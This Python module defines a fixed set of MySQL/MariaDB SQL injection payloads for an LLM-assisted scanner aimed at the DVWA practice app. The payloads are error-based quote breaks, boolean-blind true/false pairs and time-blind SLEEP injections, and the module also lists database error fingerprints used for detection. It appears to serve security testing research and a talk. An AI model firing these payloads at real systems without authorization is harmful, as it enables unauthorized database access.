# -*- coding: utf-8 -*-
"""
CWE-89 payload set -- MySQL / MariaDB family.

IMPORTANT: design principle
   The payload list is **fixed**. The LLM does not generate it.
   The LLM only decides "what context is this parameter in",
   and the code fires the whole group matching that decision.
   -> Same decision means same requests, so results reproduce across runs.

Source: selected and adapted from the public lists in SQLmap / PayloadsAllTheThings.
Target: DVWA (MariaDB). MySQL syntax works as-is.
"""

from dataclasses import dataclass
from typing import Literal

Context = Literal["numeric", "string", "unknown"]
Technique = Literal["error-based", "boolean-blind", "time-blind"]


@dataclass(frozen=True)
class Payload:
    value: str
    technique: Technique
    context: Context
    note: str = ""


# ---------------------------------------------------------------------------
# 1. error-based -- pull out DB error messages. Cheapest and fastest, so always first.
# ---------------------------------------------------------------------------
ERROR_BASED = [
    Payload("'",      "error-based", "string",  "break syntax with a single quote"),
    Payload('"',      "error-based", "string",  "double-quote context"),
    Payload("')",     "error-based", "string",  "wrapped in parentheses"),
    Payload("\\",     "error-based", "string",  "break backslash escaping"),
    Payload("1'",     "error-based", "numeric", "quote after a number"),
]

# ---------------------------------------------------------------------------
# 2. boolean-blind -- send a true/false pair and look at the response difference.
#    IMPORTANT: always send them as a pair. A single request cannot decide anything.
# ---------------------------------------------------------------------------
BOOLEAN_BLIND_STRING = [
    ("' AND '1'='1",        "' AND '1'='2"),
    ("' OR '1'='1'-- ",     "' OR '1'='2'-- "),
]
BOOLEAN_BLIND_NUMERIC = [
    (" AND 1=1",            " AND 1=2"),
    (" OR 1=1-- ",          " OR 1=2-- "),
]

# ---------------------------------------------------------------------------
# 3. time-blind -- last resort. Slow and fragile against network latency.
#    IMPORTANT: always confirm with 2 reproductions. One delay is not evidence.
# ---------------------------------------------------------------------------
SLEEP_SECONDS = 5
TIME_BLIND_STRING = [
    Payload(f"' AND SLEEP({SLEEP_SECONDS})-- ",       "time-blind", "string"),
    Payload(f"' OR SLEEP({SLEEP_SECONDS})-- ",        "time-blind", "string"),
]
TIME_BLIND_NUMERIC = [
    Payload(f" AND SLEEP({SLEEP_SECONDS})-- ",        "time-blind", "numeric"),
]

# ---------------------------------------------------------------------------
# DB error fingerprints -- if one of these is in the response, error-based is confirmed.
# The decision rule lives in code. We do not ask the LLM "does this look like an error?".
# ---------------------------------------------------------------------------
ERROR_SIGNATURES = [
    "You have an error in your SQL syntax",
    "check the manual that corresponds to your MariaDB",
    "check the manual that corresponds to your MySQL",
    "mysql_fetch_array()",
    "mysqli_fetch",
    "supplied argument is not a valid MySQL",
    "Unknown column",
    "SQLSTATE[",
    "Warning: mysql",
]


def select(context: Context, stage: int) -> list:
    """
    Returns a **fixed group** based on the context the LLM judged and the current stage.

    stage 1: error-based        (cheap. always first)
    stage 2: boolean-blind pair (when stage 1 stayed silent)
    stage 3: time-blind         (last. slow)

    IMPORTANT: the same (context, stage) input always yields the same list.
      Because the LLM does not pick the list itself, reproducibility across runs is guaranteed.
    """
    if stage == 1:
        if context == "numeric":
            return [p for p in ERROR_BASED if p.context in ("numeric", "string")]
        return [p for p in ERROR_BASED if p.context == "string"]

    if stage == 2:
        return BOOLEAN_BLIND_NUMERIC if context == "numeric" else BOOLEAN_BLIND_STRING

    if stage == 3:
        return TIME_BLIND_NUMERIC if context == "numeric" else TIME_BLIND_STRING

    return []


def has_sql_error(body: str) -> str | None:
    """If a DB error fingerprint is present in the response body, return that fingerprint."""
    for sig in ERROR_SIGNATURES:
        if sig.lower() in body.lower():
            return sig
    return None


# Total count -- used in the talk when saying "SQLmap fires thousands vs our N"
TOTAL = (len(ERROR_BASED)
         + len(BOOLEAN_BLIND_STRING) * 2 + len(BOOLEAN_BLIND_NUMERIC) * 2
         + len(TIME_BLIND_STRING) + len(TIME_BLIND_NUMERIC))

if __name__ == "__main__":
    print(f"{TOTAL} payloads total (SQLmap fires thousands indiscriminately)")
    for ctx in ("numeric", "string"):
        for st in (1, 2, 3):
            print(f"  context={ctx:8s} stage={st} -> {len(select(ctx, st))}")
